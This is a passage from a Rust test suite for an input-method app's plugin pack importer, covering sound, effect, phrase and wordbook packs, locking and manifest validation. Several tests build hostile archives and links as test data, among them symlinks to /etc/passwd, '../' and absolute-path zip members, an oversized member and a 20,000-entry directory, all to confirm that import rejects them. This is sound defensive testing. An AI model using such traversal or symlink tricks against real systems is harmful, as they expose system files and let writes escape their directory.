    assert!(sound.join(".staging-file").is_file());
    assert!(sound.join("typewriter").join(MANIFEST_FILE).is_file());
}

#[test]
fn writers_of_the_plugins_root_wait_for_the_lock_every_process_shares() {
    let state = tempdir().unwrap();
    let root = state.path().join("plugins");
    installed_sound(&root, SOUND);
    // Another process's import, as far as this one can tell: the shared file locked through a handle of its own.
    let other = crate::file_lock::open_lock_file(root.join(import::LOCK_FILE)).unwrap();
    crate::file_lock::exclusive(&other).unwrap();
    let (done, finished) = std::sync::mpsc::channel();
    let writer = {
        let root = root.clone();
        std::thread::spawn(move || {
            let removed = remove(&root, PluginKind::Sound, "typewriter");
            done.send(()).unwrap();
            removed
        })
    };
    assert!(finished
        .recv_timeout(std::time::Duration::from_millis(300))
        .is_err());
    assert!(root.join("sound/typewriter").is_dir());
    drop(other);
    writer.join().unwrap().unwrap();
    assert!(!root.join("sound/typewriter").exists());
}

#[test]
fn import_refuses_built_in_ids_and_what_is_not_a_pack() {
    let files = tempdir().unwrap();
    let state = tempdir().unwrap();
    let root = state.path().join("plugins");
    let folder = sound_pack(files.path(), &SOUND.replace("typewriter", "default"));
    assert!(matches!(import(&folder, &root), Err(PluginError::Reserved)));
    assert!(!root.join("sound").join("default").exists());

    let text = files.path().join("pack.txt");
    fs::write(&text, b"x").unwrap();
    assert!(matches!(
        import(&text, &root),
        Err(PluginError::UnsupportedSource)
    ));
    assert!(matches!(
        import(&files.path().join("missing"), &root),
        Err(PluginError::UnsupportedSource)
    ));
    let bare = files.path().join("bare");
    fs::create_dir(&bare).unwrap();
    assert!(
        matches!(import(&bare, &root), Err(PluginError::Invalid(reason)) if reason.contains("缺少 plugin.toml"))
    );
}

#[cfg(unix)]
#[test]
fn import_follows_no_symbolic_link() {
    let files = tempdir().unwrap();
    let state = tempdir().unwrap();
    let outside = tempdir().unwrap();
    let root = state.path().join("plugins");

    let folder = sound_pack(files.path(), SOUND);
    std::os::unix::fs::symlink("/etc/passwd", folder.join("passwd.txt")).unwrap();
    assert!(
        matches!(import(&folder, &root), Err(PluginError::Invalid(reason)) if reason.contains("符号链接"))
    );
    fs::remove_file(folder.join("passwd.txt")).unwrap();

    let linked = files.path().join("linked");
    std::os::unix::fs::symlink(&folder, &linked).unwrap();
    assert!(matches!(
        import(&linked, &root),
        Err(PluginError::UnsupportedSource)
    ));

    let linked_root = state.path().join("linked-plugins");
    std::os::unix::fs::symlink(outside.path(), &linked_root).unwrap();
    assert!(matches!(
        import(&folder, &linked_root),
        Err(PluginError::Storage)
    ));
    assert!(fs::read_dir(outside.path()).unwrap().next().is_none());

    fs::create_dir_all(&root).unwrap();
    std::os::unix::fs::symlink(outside.path(), root.join("sound")).unwrap();
    assert!(matches!(import(&folder, &root), Err(PluginError::Storage)));
    assert!(fs::read_dir(outside.path()).unwrap().next().is_none());
}

/// An archive member: `(name, Some(bytes))` for a file, `(name, None)` for a directory.
type Member<'a> = (&'a str, Option<&'a [u8]>);

/// A zip at `path` holding `members`.
fn zip_file(path: &Path, members: &[Member]) {
    let mut writer = zip::ZipWriter::new(fs::File::create(path).unwrap());
    let options = zip::write::SimpleFileOptions::default();
    for (name, contents) in members {
        match contents {
            Some(bytes) => {
                writer.start_file(*name, options).unwrap();
                writer.write_all(bytes).unwrap();
            }
            None => writer.add_directory(*name, options).unwrap(),
        }
    }
    writer.finish().unwrap();
}

#[test]
fn import_installs_an_archive_flat_or_in_one_folder() {
    let files = tempdir().unwrap();
    let state = tempdir().unwrap();
    let root = state.path().join("plugins");
    let wav = wav();
    let flat = files.path().join("Typewriter.ZIP");
    zip_file(
        &flat,
        &[
            (MANIFEST_FILE, Some(SOUND.as_bytes())),
            ("key.wav", Some(&wav)),
            ("space.wav", Some(&wav)),
        ],
    );
    assert_eq!(import(&flat, &root).unwrap().id, "typewriter");

    // What Finder's Compress makes: the folder, its files, and resource forks beside them.
    let wrapped = files.path().join("wrapped.zip");
    zip_file(
        &wrapped,
        &[
            ("typewriter/", None),
            (
                "typewriter/plugin.toml",
                Some(SOUND.replace("1.0.0", "1.1.0").as_bytes()),
            ),
            ("typewriter/key.wav", Some(&wav)),
            ("typewriter/space.wav", Some(&wav)),
            ("typewriter/.DS_Store", Some(b"finder")),
            ("__MACOSX/", None),
            ("__MACOSX/typewriter/._key.wav", Some(b"fork")),
        ],
    );
    let installed = import(&wrapped, &root).unwrap();
    assert_eq!(installed.version, "1.1.0");
    assert!(!installed.directory.join(".DS_Store").exists());
}

#[test]
fn hostile_archives_are_refused_before_anything_is_installed() {
    let files = tempdir().unwrap();
    let state = tempdir().unwrap();
    let root = state.path().join("plugins");
    let wav = wav();
    let manifest = SOUND.as_bytes();
    let bomb = vec![0u8; music_pack::MAX_TRACK_BYTES as usize + 1];
    let cases: Vec<(&str, Vec<Member>)> = vec![
        (
            "traversal",
            vec![(MANIFEST_FILE, Some(manifest)), ("../key.wav", Some(&wav))],
        ),
        (
            "absolute",
            vec![
                (MANIFEST_FILE, Some(manifest)),
                ("/tmp/key.wav", Some(&wav)),
            ],
        ),
        (
            "nested",
            vec![
                (MANIFEST_FILE, Some(manifest)),
                ("key.wav", Some(&wav)),
                ("space.wav", Some(&wav)),
                ("sub/", None),
                ("sub/x.wav", Some(&wav)),
            ],
        ),
        (
            "mixed",
            vec![("a/plugin.toml", Some(manifest)), ("key.wav", Some(&wav))],
        ),
        (
            "two folders",
            vec![("a/plugin.toml", Some(manifest)), ("b/key.wav", Some(&wav))],
        ),
        (
            "duplicate",
            vec![
                ("a/plugin.toml", Some(manifest)),
                ("a/key.wav", Some(&wav)),
                ("a/./key.wav", Some(&wav)),
            ],
        ),
        (
            "bomb",
            vec![(MANIFEST_FILE, Some(manifest)), ("key.wav", Some(&bomb))],
        ),
        (
            "bad name",
            vec![(MANIFEST_FILE, Some(manifest)), ("key wav.wav", Some(&wav))],
        ),
    ];
    for (label, members) in cases {
        let archive = files
            .path()
            .join(format!("{}.zip", label.replace(' ', "-")));
        zip_file(&archive, &members);
        let result = import(&archive, &root);
        assert!(
            matches!(
                result,
                Err(PluginError::Invalid(_) | PluginError::Archive(_))
            ),
            "{label}: {result:?}"
        );
    }
    let many: Vec<_> = (0..65).map(|index| format!("n{index}.txt")).collect();
    let archive = files.path().join("many.zip");
    zip_file(
        &archive,
        &many
            .iter()
            .map(|name| (name.as_str(), Some(&b"x"[..])))
            .collect::<Vec<_>>(),
    );
    assert!(matches!(
        import(&archive, &root),
        Err(PluginError::Archive(_))
    ));
    // A directory declaring far more members than a pack may have is refused while it is being read, before `zip` has allocated an entry for each.
    let crowded = files.path().join("crowded.zip");
    let mut writer = zip::ZipWriter::new(fs::File::create(&crowded).unwrap());
    for index in 0..20_000 {
        writer
            .start_file(
                format!("{index}"),
                zip::write::SimpleFileOptions::default()
                    .compression_method(zip::CompressionMethod::Stored),
            )
            .unwrap();
    }
    writer.finish().unwrap();
    match import(&crowded, &root) {
        Err(PluginError::Archive(reason)) => {
            assert!(reason.contains("目录太大"), "{reason}")
        }
        other => panic!("{other:?}"),
    }
    let garbage = files.path().join("garbage.zip");
    fs::write(&garbage, b"PK\x03\x04 not really").unwrap();
    assert!(matches!(
        import(&garbage, &root),
        Err(PluginError::Archive(_))
    ));

    assert!(!root.join("sound").exists());
    let leftovers: Vec<_> = fs::read_dir(&root)
        .unwrap()
        .map(|entry| entry.unwrap().file_name())
        .filter(|name| name != import::LOCK_FILE)
        .collect();
    assert!(leftovers.is_empty(), "{leftovers:?}");
}

#[cfg(unix)]
#[test]
fn an_archived_symbolic_link_is_refused() {
    let files = tempdir().unwrap();
    let state = tempdir().unwrap();
    let archive = files.path().join("link.zip");
    let mut writer = zip::ZipWriter::new(fs::File::create(&archive).unwrap());
    let options = zip::write::SimpleFileOptions::default();
    writer.start_file(MANIFEST_FILE, options).unwrap();
    writer.write_all(SOUND.as_bytes()).unwrap();
    writer
        .add_symlink("key.wav", "/etc/passwd", options)
        .unwrap();
    writer.finish().unwrap();
    assert!(matches!(
        import(&archive, &state.path().join("plugins")),
        Err(PluginError::Invalid(reason)) if reason.contains("符号链接")
    ));
}

#[test]
fn remove_deletes_an_installed_pack_and_nothing_else() {
    let files = tempdir().unwrap();
    let state = tempdir().unwrap();
    let root = state.path().join("plugins");
    import(&picked_folder(files.path(), SOUND), &root).unwrap();
    remove(&root, PluginKind::Sound, "typewriter").unwrap();
    assert!(scan(&root, None).packages.is_empty());
    assert!(fs::read_dir(root.join("sound")).unwrap().next().is_none());
    // Removing what is not installed succeeds; ids that are not ids and built-in packs do not.
    remove(&root, PluginKind::Sound, "typewriter").unwrap();
    remove(&root, PluginKind::Music, "typewriter").unwrap();
    assert!(matches!(
        remove(&root, PluginKind::Sound, "../sound"),
        Err(PluginError::Invalid(_))
    ));
    assert!(matches!(
        remove(&root, PluginKind::Sound, ""),
        Err(PluginError::Invalid(_))
    ));
    assert!(matches!(
        remove(&root, PluginKind::Sound, "default"),
        Err(PluginError::Reserved)
    ));
}

#[cfg(unix)]
#[test]
fn remove_unlinks_a_link_without_touching_its_target() {
    let state = tempdir().unwrap();
    let outside = tempdir().unwrap();
    let root = state.path().join("plugins");
    let target = sound_pack(outside.path(), SOUND);
    fs::create_dir_all(root.join("sound")).unwrap();
    std::os::unix::fs::symlink(&target, root.join("sound").join("typewriter")).unwrap();
    remove(&root, PluginKind::Sound, "typewriter").unwrap();
    assert!(target.join(MANIFEST_FILE).is_file());
    assert!(fs::symlink_metadata(root.join("sound").join("typewriter")).is_err());
}

#[test]
fn achievements_fire_once_per_milestone_passed() {
    assert_eq!(achievement_milestone(0, 99), None);
    assert_eq!(achievement_milestone(99, 100), Some(100));
    assert_eq!(achievement_milestone(100, 101), None);
    assert_eq!(achievement_milestone(999, 1_001), Some(1_000));
    assert_eq!(achievement_milestone(50, 20_000), Some(10_000));
    assert_eq!(achievement_milestone(2_000, 10), None);
    assert_eq!(achievement_milestone(u64::MAX - 1, u64::MAX), None);
}

#[test]
fn kinds_are_a_closed_set() {
    for kind in PluginKind::ALL {
        assert_eq!(PluginKind::parse(kind.as_str()), Some(kind));
    }
    for other in ["", "script", "wasm", "dylib", "Sound", "command-table"] {
        assert_eq!(PluginKind::parse(other), None);
    }
}

#[test]
fn failures_carry_the_code_and_the_rule_that_was_broken() {
    let failure = PluginFailure::from(PluginError::Invalid("缺少 plugin.toml".into()));
    assert_eq!(failure.code, "plugin_invalid");
    assert_eq!(failure.detail.as_deref(), Some("缺少 plugin.toml"));
    assert_eq!(
        PluginFailure::from(PluginError::Archive("压缩包太大".into())).code,
        "plugin_archive"
    );
    assert_eq!(
        PluginFailure::from(PluginError::UnsupportedSource),
        PluginFailure::code("plugin_unsupported_source")
    );
    assert_eq!(
        PluginFailure::from(PluginError::Reserved),
        PluginFailure::code("plugin_reserved")
    );
    assert_eq!(
        PluginFailure::from(PluginError::Storage),
        PluginFailure::code("plugin_storage")
    );
    assert_eq!(
        PluginFailure::from(PluginError::Io(std::io::Error::other("disk"))),
        PluginFailure::code("storage")
    );
    let failure = PluginFailure::from(mentions::MentionError::Invalid("「张三」为空或太长".into()));
    assert_eq!(failure.code, "mention_invalid");
    assert_eq!(failure.detail.as_deref(), Some("「张三」为空或太长"));
    assert_eq!(
        PluginFailure::from(mentions::MentionError::Format),
        PluginFailure::code("mention_format")
    );
    assert_eq!(
        PluginFailure::from(mentions::MentionError::Storage),
        PluginFailure::code("mention_storage")
    );
    assert_eq!(
        serde_json::to_value(PluginFailure::code("plugin_reserved")).unwrap(),
        serde_json::json!({"code": "plugin_reserved", "detail": null})
    );
}

#[test]
fn remove_named_refuses_unknown_kinds_and_built_in_sound_packs() {
    let files = tempdir().unwrap();
    let state = tempdir().unwrap();
    let root = state.path().join("plugins");
    import(&picked_folder(files.path(), SOUND), &root).unwrap();
    assert_eq!(
        remove_named(&root, "script", "typewriter"),
        Err(PluginFailure::code("invalid"))
    );
    assert_eq!(
        remove_named(&root, "sound", "default"),
        Err(PluginFailure::code("plugin_reserved"))
    );
    remove_named(&root, "sound", "typewriter").unwrap();
    assert!(scan(&root, None).packages.is_empty());
}

fn effect_manifest(id: &str, effect: &str) -> String {
    format!("schema_version = 1\nkind = 'effect'\nid = '{id}'\nname = '霓虹'\nversion = '1'\nlicense = 'CC0-1.0'\n[effect]\n{effect}")
}

fn installed_effect(root: &Path, id: &str, effect: &str) -> PathBuf {
    let pack = kind_directory(root, PluginKind::Effect).join(id);
    fs::create_dir_all(&pack).unwrap();
    fs::write(pack.join(MANIFEST_FILE), effect_manifest(id, effect)).unwrap();
    pack
}

#[test]
fn effect_packs_carry_only_bounded_parameters() {
    let root = tempdir().unwrap();
    let pack = installed_effect(
        root.path(),
        "neon",
        "style = 'power_mode'\nintensity = 100\ncolors = ['#FFB000', '#ff4060', '#00C2FF', '#7a5cff']\nduration_ms = 1500\nparticles = 64\n",
    );
    fs::write(pack.join("LICENSE.txt"), b"CC0").unwrap();
    let loaded = load_package(root.path(), None, PluginKind::Effect, "neon").unwrap();
    assert_eq!(loaded.kind(), PluginKind::Effect);
    assert!(!is_builtin(PluginKind::Effect, "neon"));
    let PluginContent::Effect(effect) = &loaded.content else {
        panic!("an effect pack");
    };
    assert_eq!(effect.style, EffectStyle::PowerMode);
    assert_eq!(effect.intensity, 100);
    assert_eq!(effect.colors, ["#FFB000", "#ff4060", "#00C2FF", "#7a5cff"]);
    assert_eq!(effect.duration_ms, Some(1500));
    assert_eq!(effect.particles, Some(64));
    // The catalog flattens the parameters beside the kind, as it does a sound pack's mode.
    let listed = serde_json::to_value(&loaded).unwrap();
    assert_eq!(listed["kind"], "effect");
    assert_eq!(listed["style"], "power_mode");
    assert_eq!(listed["particles"], 64);

    // Only the style is required; the rest are the host's own.
    installed_effect(root.path(), "plain", "style = 'flash'\n");
    let PluginContent::Effect(plain) = load_package(root.path(), None, PluginKind::Effect, "plain")
        .unwrap()
        .content
    else {
        panic!("an effect pack");
    };
    assert_eq!(
        plain,
        effect_pack::EffectPack {
            style: EffectStyle::Flash,
            intensity: effect_pack::DEFAULT_INTENSITY,
            colors: Vec::new(),
            duration_ms: None,
            particles: None,
        }
    );

    for (effect, expected) in [
        ("", "effect.style 只能是"),
        ("style = 'off'\n", "effect.style 只能是"),
        ("style = 'confetti'\n", "effect.style 只能是"),
        ("style = 'flash'\nintensity = 101\n", "effect.intensity"),
        ("style = 'flash'\nintensity = -1\n", "effect.intensity"),
        ("style = 'flash'\nintensity = 50.5\n", "effect.intensity"),
        ("style = 'flash'\nduration_ms = 59\n", "effect.duration_ms"),
        (
            "style = 'flash'\nduration_ms = 1501\n",
            "effect.duration_ms",
        ),
        (
            "style = 'flash'\nduration_ms = 70000\n",
            "effect.duration_ms",
        ),
        ("style = 'flash'\nparticles = 65\n", "effect.particles"),
        ("style = 'flash'\ncolors = []\n", "1 到 4 个颜色"),
        (
            "style = 'flash'\ncolors = ['#000000', '#000000', '#000000', '#000000', '#000000']\n",
            "1 到 4 个颜色",
        ),
        ("style = 'flash'\ncolors = '#FFFFFF'\n", "colors 必须是数组"),
        ("style = 'flash'\ncolors = ['#FFF']\n", "#RRGGBB"),
        ("style = 'flash'\ncolors = ['#FFFFFF80']\n", "#RRGGBB"),
        ("style = 'flash'\ncolors = ['red']\n", "#RRGGBB"),
        ("style = 'flash'\ncolors = ['#GGGGGG']\n", "#RRGGBB"),
        ("style = 'flash'\ncolors = [16777215]\n", "#RRGGBB"),
        (
            "style = 'flash'\nshader = 'x.glsl'\n",
            "effect 里有未知的键 shader",
        ),
    ] {
        installed_effect(root.path(), "bad", effect);
        let error = reason(root.path(), PluginKind::Effect, "bad");
        assert!(error.contains(expected), "{effect}: {error}");
    }
    // No `[effect]` table, a key beside it, or a file of any other kind.
    let bad = kind_directory(root.path(), PluginKind::Effect).join("bad");
    fs::write(
        bad.join(MANIFEST_FILE),
        "schema_version = 1\nkind = 'effect'\nid = 'bad'\nname = 'x'\nversion = '1'\nlicense = 'MIT'\n",
    )
    .unwrap();
    assert!(reason(root.path(), PluginKind::Effect, "bad").contains("缺少 effect 表"));
    fs::write(
        bad.join(MANIFEST_FILE),
        format!(
            "{}[sounds]\ndefault = 'key.wav'\n",
            effect_manifest("bad", "style = 'flash'\n")
        ),
    )
    .unwrap();
    assert!(reason(root.path(), PluginKind::Effect, "bad").contains("未知的键 sounds"));
    fs::write(
        bad.join(MANIFEST_FILE),
        effect_manifest("bad", "style = 'flash'\n"),
    )
    .unwrap();
    fs::write(bad.join("spark.wav"), wav()).unwrap();
    assert!(reason(root.path(), PluginKind::Effect, "bad")
        .contains("spark.wav 没有在 plugin.toml 里用到"));

    assert_eq!(scan(root.path(), None).packages.len(), 2);
}

#[test]
fn a_typing_effect_resolves_the_selected_pack_or_draws_nothing() {
    let root = tempdir().unwrap();
    installed_effect(
        root.path(),
        "neon",
        "style = 'sparks'\nintensity = 80\ncolors = ['#FFB000']\nparticles = 12\n",
    );
    use effect_pack::TypingEffect;
    // No pack: the preferences' own style and intensity.
    let unselected = TypingEffect::resolve(Some(root.path()), "", EffectStyle::Flash, 30);
    assert_eq!(
        unselected,
        TypingEffect::from_preferences(EffectStyle::Flash, 30)
    );
    assert_eq!(unselected.pack, None);
    // A pack replaces both, whatever the preferences say.
    let selected = TypingEffect::resolve(Some(root.path()), "neon", EffectStyle::Off, 30);
    assert_eq!(selected.pack.as_deref(), Some("neon"));
    assert_eq!(selected.issue, None);
    assert_eq!(selected.style, EffectStyle::Sparks);
    assert_eq!(selected.intensity, 80);
    assert_eq!(selected.colors, ["#FFB000"]);
    assert_eq!((selected.duration_ms, selected.particles), (None, Some(12)));
    // A pack that is gone or broken draws nothing rather than another style.
    for (root, id) in [(Some(root.path()), "missing"), (None, "neon")] {
        let unavailable = TypingEffect::resolve(root, id, EffectStyle::PowerMode, 30);
        assert_eq!(unavailable.style, EffectStyle::Off, "{id}");
        assert_eq!(unavailable.pack.as_deref(), Some(id));
        assert!(unavailable.issue.is_some(), "{id}");
    }
    let json = serde_json::to_value(&selected).unwrap();
    assert_eq!(
        json,
        serde_json::json!({"pack": "neon", "issue": null, "style": "sparks", "intensity": 80, "colors": ["#FFB000"], "duration_ms": null, "particles": 12})
    );
}

#[test]
fn validate_applies_the_import_rules_without_installing() {
    let files = tempdir().unwrap();
    let folder = picked_folder(files.path(), SOUND);
    let checked = validate(&folder).unwrap();
    assert_eq!(
        (
            checked.id.as_str(),
            checked.kind(),
            checked.version.as_str()
        ),
        ("typewriter", PluginKind::Sound, "1.0.0")
    );
    assert_eq!(checked.directory, folder);

    // The archive rules too: a pack zipped inside one folder is valid, a nested folder is not.
    let wav = wav();
    let wrapped = files.path().join("wrapped.zip");
    zip_file(
        &wrapped,
        &[
            ("typewriter/plugin.toml", Some(SOUND.as_bytes())),
            ("typewriter/key.wav", Some(&wav)),
            ("typewriter/space.wav", Some(&wav)),
        ],
    );
    assert_eq!(validate(&wrapped).unwrap().id, "typewriter");
    let nested = files.path().join("nested.zip");
    zip_file(
        &nested,
        &[
            (MANIFEST_FILE, Some(SOUND.as_bytes())),
            ("key.wav", Some(&wav)),
            ("space.wav", Some(&wav)),
            ("sub/key.wav", Some(&wav)),
        ],
    );
    assert!(
        matches!(validate(&nested), Err(PluginError::Invalid(reason)) if reason.contains("子文件夹"))
    );

    // A built-in id, a source that is not a pack, and a pack that breaks a manifest rule.
    let reserved = tempdir().unwrap();
    let folder = sound_pack(reserved.path(), &SOUND.replace("typewriter", "default"));
    assert!(matches!(validate(&folder), Err(PluginError::Reserved)));
    let text = files.path().join("pack.txt");
    fs::write(&text, b"x").unwrap();
    assert!(matches!(
        validate(&text),
        Err(PluginError::UnsupportedSource)
    ));
    let ogg = tempdir().unwrap();
    let folder = sound_pack(ogg.path(), &SOUND.replace("space.wav", "space.ogg"));
    fs::rename(folder.join("space.wav"), folder.join("space.ogg")).unwrap();
    assert!(
        matches!(validate(&folder), Err(PluginError::Invalid(reason)) if reason.contains("只接受 WAV"))
    );
    // Nothing was left beside the source.
    let mut left: Vec<_> = fs::read_dir(ogg.path())
        .unwrap()
        .map(|entry| entry.unwrap().file_name().into_string().unwrap())
        .collect();
    left.sort();
    assert_eq!(left, ["typewriter"]);
}

#[test]
fn data_files_are_checked_by_name_size_and_extension_not_as_notices() {
    let pack = tempdir().unwrap();
    let directory = pack.path();
    fs::write(directory.join(MANIFEST_FILE), "x").unwrap();
    // 比说明文件的上限大，作为数据文件仍然允许。
    let table = vec![b'a'; MAX_NOTICE_BYTES as usize + 1];
    fs::write(directory.join("table.txt"), &table).unwrap();
    fs::write(directory.join("README.md"), "说明").unwrap();
    let data = |name: &str, max_bytes: u64, extension: &'static str| DataFile {
        name: name.into(),
        max_bytes,
        extension,
    };
    let check = |data: &[DataFile]| {
        let files = list_files(directory).unwrap();
        check_files(directory, &files, &[], AudioLimits::NONE, data)
    };
    check(&[data("table.txt", 1024 * 1024, "txt")]).unwrap();
    // 不点名时它只是一个太大的说明文件。
    assert_eq!(check(&[]).unwrap_err(), "table.txt 太大");
    assert_eq!(
        check(&[data("table.txt", MAX_NOTICE_BYTES, "txt")]).unwrap_err(),
        "table.txt 为空或太大"
    );
    assert_eq!(
        check(&[data("table.txt", 1024 * 1024, "tsv")]).unwrap_err(),
        "table.txt 的扩展名必须是 .tsv"
    );
    assert_eq!(
        check(&[data("words.tsv", 1024 * 1024, "tsv")]).unwrap_err(),
        "缺少数据文件 words.tsv"
    );
    assert_eq!(
        check(&[data(MANIFEST_FILE, 1024, "toml")]).unwrap_err(),
        "plugin.toml 不能同时用作别的文件"
    );
    fs::write(directory.join("empty.txt"), "").unwrap();
    assert_eq!(
        check(&[
            data("table.txt", 1024 * 1024, "txt"),
            data("empty.txt", 1024, "txt")
        ])
        .unwrap_err(),
        "empty.txt 为空或太大"
    );
}

/// `tests/fixtures/plugin-packs` 下的共享 fixture 包：`valid/<kind>-<case>` 必须通过、类型与目录名前缀一致；`invalid/<kind>-<case>` 必须因为下表写的原因被拒绝。后端（msime-cloud）的 Go 校验器在自己的测试里放一份相同内容的 fixture，两边对同一批包给出同样的接受与拒绝。
fn fixture_packs() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/plugin-packs")
}

/// 每个 invalid fixture 被拒绝的原因（原因文本的一部分）。
const FIXTURE_REFUSALS: &[(&str, &str)] = &[
    (
        "helpcode-ascii-char",
        "table.txt 第 1 行的字不能是 ASCII、空白或控制字符",
    ),
    (
        "helpcode-bad-file-name",
        "helpcode.table 的文件名 ../table.txt 无效",
    ),
    (
        "helpcode-blank-line-with-space",
        "table.txt 第 2 行不是「字=码」",
    ),
    (
        "helpcode-control-char",
        "table.txt 第 1 行的字不能是 ASCII、空白或控制字符",
    ),
    (
        "helpcode-digit-code",
        "table.txt 第 1 行的码必须是 1 到 2 个小写字母",
    ),
    (
        "helpcode-duplicate-char",
        "table.txt 里「啊」出现了不止一次",
    ),
    (
        "helpcode-empty-code",
        "table.txt 第 1 行的码必须是 1 到 2 个小写字母",
    ),
    ("helpcode-empty-file", "table.txt 为空或太大"),
    ("helpcode-invalid-utf8", "table.txt 不是 UTF-8 编码"),
    (
        "helpcode-leading-space",
        "table.txt 第 1 行等号左边必须恰好是一个字",
    ),
    (
        "helpcode-lone-cr",
        "table.txt 第 1 行的码必须是 1 到 2 个小写字母",
    ),
    ("helpcode-missing-file", "缺少数据文件 table.txt"),
    ("helpcode-missing-table-key", "helpcode.table 必须是字符串"),
    (
        "helpcode-no-char",
        "table.txt 第 1 行等号左边必须恰好是一个字",
    ),
    ("helpcode-no-equals", "table.txt 第 1 行不是「字=码」"),
    ("helpcode-only-comments", "table.txt 里没有任何辅助码"),
    (
        "helpcode-space-after-equals",
        "table.txt 第 1 行的码必须是 1 到 2 个小写字母",
    ),
    (
        "helpcode-space-before-equals",
        "table.txt 第 1 行等号左边必须恰好是一个字",
    ),
    (
        "helpcode-three-letter-code",
        "table.txt 第 1 行的码必须是 1 到 2 个小写字母",
    ),
    (
        "helpcode-trailing-space",
        "table.txt 第 1 行的码必须是 1 到 2 个小写字母",
    ),
    (
        "helpcode-two-chars",
        "table.txt 第 1 行等号左边必须恰好是一个字",
    ),
    ("helpcode-unknown-key", "helpcode 里有未知的键 schema"),
    (
        "helpcode-uppercase-code",
        "table.txt 第 1 行的码必须是 1 到 2 个小写字母",
    ),
    (
        "helpcode-whitespace-char",
        "table.txt 第 1 行的字不能是 ASCII、空白或控制字符",
    ),
    ("helpcode-wrong-extension", "table.tsv 的扩展名必须是 .txt"),
    ("phrase_table-blank-text", "短语 dh 的文本为空或太长"),
    (
        "phrase_table-digit-key",
        "短语编码 d1 必须是 1 到 32 个小写字母",
    ),
    ("phrase_table-duplicate", "短语 dh 的「电话」重复了"),
    ("phrase_table-empty", "短语表的条数不在允许范围内"),
    (
        "phrase_table-empty-key",
        "短语编码  必须是 1 到 32 个小写字母",
    ),
    ("phrase_table-empty-text", "短语 dh 的文本为空或太长"),
    (
        "phrase_table-long-key",
        "短语编码 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 必须是 1 到 32 个小写字母",
    ),
    ("phrase_table-long-text", "短语 dh 的文本为空或太长"),
    ("phrase_table-missing", "短语表缺少 phrases"),
    ("phrase_table-missing-text", "每条短语都需要 text"),
    (
        "phrase_table-newline-in-text",
        "短语 dh 的文本含有换行、制表符等控制字符",
    ),
    ("phrase_table-non-string-text", "每条短语都需要 text"),
    (
        "phrase_table-permissions",
        "插件不能申请权限，permissions 必须为空",
    ),
    (
        "phrase_table-tab-in-text",
        "短语 dh 的文本含有换行、制表符等控制字符",
    ),
    (
        "phrase_table-unknown-row-key",
        "a phrase 里有未知的键 weight",
    ),
    (
        "phrase_table-unknown-top-key",
        "plugin.toml 里有未知的键 commands",
    ),
    (
        "phrase_table-unnamed-data-file",
        "table.tsv 没有在 plugin.toml 里用到",
    ),
    (
        "phrase_table-uppercase-key",
        "短语编码 Dh 必须是 1 到 32 个小写字母",
    ),
    (
        "symbol_set-bad-tab",
        "第 1 组的 tab 只能是 symbols 或 kaomoji",
    ),
    (
        "symbol_set-blank-item",
        "第 1 组有一项为空、超过 64 个 UTF-16 单元或含有控制字符",
    ),
    (
        "symbol_set-blank-title",
        "第 1 组的 title 为空、超过 48 字节或含有控制字符",
    ),
    (
        "symbol_set-control-in-keywords",
        "第 1 组的 keywords 为空、超过 256 字节或含有控制字符",
    ),
    (
        "symbol_set-control-item",
        "第 1 组有一项为空、超过 64 个 UTF-16 单元或含有控制字符",
    ),
    ("symbol_set-duplicate-item", "第 1 组里「→」重复了"),
    (
        "symbol_set-duplicate-title",
        "第 2 组的 title「箭头」与同一标签页的另一组重复了",
    ),
    (
        "symbol_set-empty-item",
        "第 1 组有一项为空、超过 64 个 UTF-16 单元或含有控制字符",
    ),
    (
        "symbol_set-empty-keywords",
        "第 1 组的 keywords 为空、超过 256 字节或含有控制字符",
    ),
    (
        "symbol_set-long-item",
        "第 1 组有一项为空、超过 64 个 UTF-16 单元或含有控制字符",
    ),
    (
        "symbol_set-long-keywords",
        "第 1 组的 keywords 为空、超过 256 字节或含有控制字符",
    ),
    (
        "symbol_set-long-title",
        "第 1 组的 title 为空、超过 48 字节或含有控制字符",
    ),
    ("symbol_set-missing-items", "第 1 组需要 items"),
    (
        "symbol_set-missing-tab",
        "第 1 组的 tab 只能是 symbols 或 kaomoji",
    ),
    ("symbol_set-missing-title", "第 1 组需要字符串 title"),
    ("symbol_set-no-groups", "符号集必须有 1 到 32 组"),
    ("symbol_set-no-items", "第 1 组必须有 1 到 512 项"),
    ("symbol_set-number-item", "第 1 组的每一项都必须是字符串"),
    ("symbol_set-too-many-groups", "符号集必须有 1 到 32 组"),
    (
        "symbol_set-too-many-items-in-group",
        "第 1 组必须有 1 到 512 项",
    ),
    ("symbol_set-too-many-items-total", "符号集合计超过 2048 项"),
    (
        "symbol_set-unknown-group-key",
        "a symbol group 里有未知的键 parent",
    ),
    (
        "symbol_set-with-data-file",
        "symbols.tsv 没有在 plugin.toml 里用到",
    ),
    (
        "wordbook-control-in-meaning",
        "words.tsv 第 1 行的单词或释义为空，或者某一列太长、含有控制字符",
    ),
    (
        "wordbook-duplicate-word",
        "words.tsv 里「cache」出现了不止一次",
    ),
    ("wordbook-empty-file", "words.tsv 为空或太大"),
    (
        "wordbook-empty-meaning",
        "words.tsv 第 1 行的单词或释义为空，或者某一列太长、含有控制字符",
    ),
    (
        "wordbook-empty-meaning-three-columns",
        "words.tsv 第 1 行的单词或释义为空，或者某一列太长、含有控制字符",
    ),
    (
        "wordbook-empty-word",
        "words.tsv 第 1 行的单词或释义为空，或者某一列太长、含有控制字符",
    ),
    ("wordbook-four-columns", "words.tsv 第 1 行必须是「单词"),
    (
        "wordbook-id-too-long",
        "单词本的 id 只能由小写字母、数字和 - 组成，首尾不能是 -，且不超过 59 个字符",
    ),
    (
        "wordbook-id-trailing-dash",
        "单词本的 id 只能由小写字母、数字和 - 组成，首尾不能是 -，且不超过 59 个字符",
    ),
    (
        "wordbook-id-with-dot",
        "单词本的 id 只能由小写字母、数字和 - 组成，首尾不能是 -，且不超过 59 个字符",
    ),
    (
        "wordbook-id-with-underscore",
        "单词本的 id 只能由小写字母、数字和 - 组成，首尾不能是 -，且不超过 59 个字符",
    ),
    ("wordbook-invalid-utf8", "words.tsv 不是 UTF-8 编码"),
    (
        "wordbook-lone-cr",
        "words.tsv 第 1 行的单词或释义为空，或者某一列太长、含有控制字符",
    ),
    (
        "wordbook-long-meaning",
        "words.tsv 第 1 行的单词或释义为空，或者某一列太长、含有控制字符",
    ),
    (
        "wordbook-long-phonetic",
        "words.tsv 第 1 行的单词或释义为空，或者某一列太长、含有控制字符",
    ),
    (
